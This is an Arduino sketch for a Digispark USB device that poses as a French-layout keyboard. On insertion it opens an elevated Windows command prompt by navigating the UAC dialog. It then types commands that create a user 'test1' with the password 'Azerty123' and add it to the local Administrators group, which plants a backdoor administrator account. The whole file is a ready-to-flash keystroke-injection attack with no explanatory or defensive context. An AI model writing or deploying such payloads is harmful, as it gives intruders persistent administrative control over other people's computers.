#include <DigiKeyboardFr.h>

void setup() {
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT); 
  DigiKeyboard.delay(2000);  
  DigiKeyboardFr.print("cmd");
  DigiKeyboard.delay(500);  
  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT); 
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN); 
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(2000); 
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ESC); 
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_ALT_LEFT); 
  DigiKeyboard.delay(2000);   
  DigiKeyboardFr.print("net user test1 Azerty123 /ADD");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboardFr.print("net localgroup Administrateurs test1 /ADD");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);  
  DigiKeyboardFr.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
